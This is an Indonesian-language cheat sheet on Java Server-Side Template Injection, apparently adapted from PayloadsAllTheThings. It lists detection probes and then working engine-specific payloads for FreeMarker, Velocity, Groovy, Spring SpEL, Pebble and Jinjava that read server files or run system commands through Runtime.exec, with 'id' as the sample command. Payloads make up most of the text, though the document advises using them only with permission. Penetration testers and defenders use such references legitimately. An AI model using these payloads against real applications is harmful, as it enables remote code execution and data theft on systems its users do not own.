# Server Side Template Injection - Java

> **Server-Side Template Injection (SSTI)** adalah kerentanan keamanan di mana input pengguna dimasukkan ke dalam template di sisi server tanpa validasi yang benar, sehingga penyerang dapat mengeksekusi kode arbitrer. Pada Java, SSTI bisa terjadi pada engine seperti JSP, Thymeleaf, FreeMarker, Velocity, Pebble, dan lainnya.

## Ringkasan

- [Library Template Populer](#library-template-populer)
- [Payload Dasar](#payload-dasar)
- [Payload Spesifik Engine](#payload-spesifik-engine)
- [Referensi](#referensi)

## Library Template Populer

| Nama Template | Format Payload      | Bahasa Pemrograman |
| ------------- | ------------------- | ------------------ |
| JSP           | `<%= ... %>`        | Java               |
| FreeMarker    | `${3*3}` / `#{3*3}` | Java               |
| Groovy        | `${9*9}`            | Java               |
| Jinjava       | `{{ }}`             | Java               |
| Pebble        | `{{ }}`             | Java               |
| Spring SpEL   | `${7*7}` / `*{7*7}` | Java               |
| Thymeleaf     | `[[ ... ]]`         | Java               |
| Velocity      | `#set($x="") $x`    | Java               |

## Payload Dasar

Coba payload berikut pada input yang dicurigai:

```java
${7*7}
#{7*7}
*{7*7}
[[7*7]]
<%= 7*7 %>
```

Jika output menjadi `49`, kemungkinan aplikasi rentan SSTI.

## Payload Spesifik Engine

### FreeMarker

- **Eksekusi kode sederhana:**
  ```java
  ${3*3}
  ```
- **Baca file:**
  ```java
  ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_file').toURL().openStream().readAllBytes()?join(" ")}
  ```
- **Eksekusi perintah:**
  ```java
  ${"freemarker.template.utility.Execute"?new()("id")}
  ```

### Velocity

- **Eksekusi perintah:**
  ```java
  #set($e="".getClass().forName("java.lang.Runtime").getRuntime().exec("id"))
  ```

### Groovy

- **Eksekusi perintah:**
  ```groovy
  ${"id".execute()}
  ```

### Spring Expression Language (SpEL)

- **Eksekusi perintah:**
  ```java
  ${T(java.lang.Runtime).getRuntime().exec('id')}
  ```

### Pebble

- **Eksekusi perintah (versi lama):**
  ```java
  {{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}
  ```

### Jinjava

- **Eksekusi kode:**
  ```python
  {{ 'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("java.lang.Runtime.getRuntime().exec('id')") }}
  ```

## Tips

- Selalu cek output aplikasi setelah mengirim payload.
- Gunakan variasi payload jika satu format tidak berhasil.
- Setelah engine teridentifikasi, cari dokumentasi exploitasi engine tersebut.
- Gunakan payload hanya di lingkungan yang aman dan dengan izin yang sesuai.

## Referensi

- [PayloadAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
